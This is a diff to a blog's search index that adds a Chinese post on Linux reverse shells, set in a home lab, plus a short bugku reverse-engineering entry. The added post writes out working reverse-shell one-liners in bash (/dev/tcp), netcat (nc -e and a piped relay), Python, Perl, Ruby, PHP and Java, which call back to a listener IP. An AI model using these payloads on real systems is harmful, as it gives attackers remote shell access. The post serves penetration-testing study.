@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[linux反弹shell]]></title>
+    <url>%2F2019%2F07%2F29%2Flinux%E5%8F%8D%E5%BC%B9shell%2F</url>
+    <content type="text"><![CDATA[之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下. 为什么要反弹shell在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务器对外连接进行限制(特殊情况除外),这时候就可以通过反弹shell来获取连接,即通过服务器反向连接一个外部机器来获取一个shell. 反弹shell在理解反弹shell的操作命令前,可以先看一看前辈写的linux文件描述符.攻击机kali:192.168.91.133靶机ubuntu:192.168.91.134 bashbash反弹shell应该是最常见的操作.攻击机kali监听2333端口:1nc -lvp 2333 靶机:1bash -i &gt;&amp; /dev/tcp/192.168.91.133/2333 0&gt;&amp;1 然后kali上就出现了ubuntu的shell. bash -i 表示产生一个交互式的shell dev/tcp/host/port 这个文件非常特殊,可以理解为一个设备.如果host 是一个合法的主机名或internet地址,并且port是一个整数端口号或服务名,bash试图建立与相应的socket(套接字)的TCP连接. netcat反弹shellnetcat的-e参数后面跟一个可执行程序的名称,因为我的ubuntu的netcat是不带这个参数e的,所以这里我用kali作为靶机,ubuntu攻击机.ubuntu监听2333端口:1nc -lvp 2333 kali弹shell给ubuntu:1nc -e /bin/bash 192.168.91.134 2333 成功弹shell. 利用管道反弹shell因为有的发行版linux中netcat是不带这个参数的,这时候可以利用管道进行反弹shell.首先攻击机kali监听两个端口2333,7777:然后ubuntu连接攻击机2333端口,将传递过来的命令交给/bin/bash执行然后将结果返回到7777端口:1nc 192.168.91.133 2333 | /bin/bash | nc 192.168.91.133 7777 监听2333端口的会话成功得到shell,然后执行命令,结果返回在7777端口的会话. 常见脚本反弹python1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' perl方法1:1perl -e 'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' 方法2:1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' ruby1ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' php1php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' java12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125;]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[bugku逆向]]></title>
     <url>%2F2019%2F07%2F29%2Fbugku%E9%80%86%E5%90%91%2F</url>
     <content type="text"><![CDATA[从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习. 入门逆向下载到后直接拖到IDA里,直接可以看到printf函数.对着最右边的字符一顿R,就得到flag了. Easy_vb下载后拖到IDA,ALT+T搜索字符串,先搜flag搜不到,再搜{就出来了.]]></content>
@@ -244,8 +255,8 @@
       <tags>
         <tag>ctf</tag>
         <tag>web安全</tag>
-        <tag>代码审计</tag>
         <tag>php</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
